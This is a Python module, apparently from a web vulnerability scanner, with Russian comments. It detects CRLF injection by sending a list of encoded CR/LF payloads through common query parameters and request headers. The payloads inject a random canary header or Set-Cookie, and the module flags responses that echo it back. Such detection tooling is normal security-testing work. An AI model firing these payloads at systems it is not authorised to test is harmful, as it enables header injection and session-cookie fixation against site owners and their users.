"""crlf v2 — baseline-aware CRLF injection (headers, cookies, redirects)"""
from core.http import HttpClient
from core.verify import verify, confidence, is_signal
from core.payload_source import get_payloads
from core.waf_bypass import mutate_until_pass

# уникальный canary-маркер (не встретится в baseline)
CANARY_HEADER = "X-Omni-Crlf"
CANARY_VALUE = "omni" + __import__("secrets").token_hex(4)
CANARY_COOKIE = "omni_crlf_" + __import__("secrets").token_hex(4)

# payload-формы: разные способы инъекции CRLF
CRLF_PAYLOADS = [
    f"%0d%0a{CANARY_HEADER}:%20{CANARY_VALUE}",
    f"%0a{CANARY_HEADER}:%20{CANARY_VALUE}",
    f"%0d%0aSet-Cookie:%20{CANARY_COOKIE}={CANARY_VALUE}",
    f"%0aSet-Cookie:%20{CANARY_COOKIE}={CANARY_VALUE}",
    f"\\r\\n{CANARY_HEADER}:%20{CANARY_VALUE}",
    f"%E5%98%8A%E5%98%8D{CANARY_HEADER}:%20{CANARY_VALUE}",   # UTF-8 CRLF (U+560A U+560D)
    f"%23%0d%0a{CANARY_HEADER}:%20{CANARY_VALUE}",
    f"x%0d%0a{CANARY_HEADER}:%20{CANARY_VALUE}",
    f"%0d%0a%20{CANARY_HEADER}:%20{CANARY_VALUE}",            # leading space after CRLF
    f"%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a{CANARY_HEADER}:%20{CANARY_VALUE}",
]

# где пробуем инъекцию
PARAMS = ["url", "next", "redirect", "return", "path", "dest", "target",
          "continue", "ref", "q", "query", "search", "name", "id", "u", "r",
          "callback", "lang", "page", "view", "file", "include", "action"]

HEADERS_TO_INJECT = ["X-Custom", "User-Agent", "Referer", "X-Forwarded-For",
                     "X-Forwarded-Host", "X-Real-IP", "Cookie", "X-Requested-With"]


def _has_injection(r):
    """Возвращает True если canary-заголовок или cookie появились в ответе."""
    if r is None:
        return False
    hdrs_low = {k.lower(): str(v).lower() for k, v in r.headers.items()}
    if CANARY_HEADER.lower() in hdrs_low:
        return True
    if CANARY_VALUE.lower() in str(hdrs_low.values()).lower():
        return True
    if CANARY_COOKIE.lower() in str(hdrs_low.values()).lower():
        return True
    # в Location
    loc = hdrs_low.get("location", "")
    if CANARY_HEADER.lower() in loc or CANARY_VALUE.lower() in loc:
        return True
    return False


class Crlf:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)

        # baseline: обычный запрос — что в headers/cookies без payload
        try:
            base_r = http.get(target)
            base_hdrs = dict(base_r.headers) if base_r else {}
        except Exception:
            base_hdrs = {}

        # если canary случайно в baseline — аномалия, пропускаем (не должно быть)
        if _has_injection(base_r) if base_r else False:
            print("[crlf v2] canary already in baseline — abort")
            return {"findings": []}

        print(f"[crlf v2] target: {target}")
        print(f"[crlf v2] canary: {CANARY_HEADER}={CANARY_VALUE}")

        findings = []

        # === 1. Инъекция через query-параметры ===
        for name in PARAMS:
            for payload in CRLF_PAYLOADS:
                sep = "&" if "?" in target else "?"
                new_url = f"{target}{sep}{name}={payload}"
                try:
                    r = http.get(new_url, allow_redirects=False)
                except Exception:
                    continue
                if not r or not _has_injection(r):
                    continue

                def rep():
                    try:
                        return http.get(new_url, allow_redirects=False)
                    except Exception:
                        return None

                def predicate(s):
                    return _has_injection(s)

                ratio, hits = verify(rep, predicate, n=2, delay=0.2)
                conf = confidence(0.9, ratio)
                if not is_signal(conf, floor=0.55, module="crlf"):
                    continue

                findings.append({
                    "location": f"query:{name}",
                    "payload": payload[:80],
                    "verify_hits": hits,
                    "confidence": conf,
                })
                print(f"  ✓ CRLF via {name}")
                logger.finding("crlf", "high",
                               f"query {name} conf={int(conf*100)}")
                break  # хватит одного payload'а на param

        # === 2. Инъекция через заголовки ===
        for h in HEADERS_TO_INJECT:
            for payload in CRLF_PAYLOADS:
                try:
                    r = http.get(target, headers={h: payload}, allow_redirects=False)
                except Exception:
                    continue
                if not r or not _has_injection(r):
                    continue

                def rep():
                    try:
                        return http.get(target, headers={h: payload}, allow_redirects=False)
                    except Exception:
                        return None

                def predicate(s):
                    return _has_injection(s)

                ratio, hits = verify(rep, predicate, n=2, delay=0.2)
                conf = confidence(0.9, ratio)
                if not is_signal(conf, floor=0.55, module="crlf"):
                    continue

                findings.append({
                    "location": f"header:{h}",
                    "payload": payload[:80],
                    "verify_hits": hits,
                    "confidence": conf,
                })
                print(f"  ✓ CRLF via {h}")
                logger.finding("crlf", "high",
                               f"header {h} conf={int(conf*100)}")
                break

        print(f"[crlf v2] findings: {len(findings)}")
        return {"findings": findings}
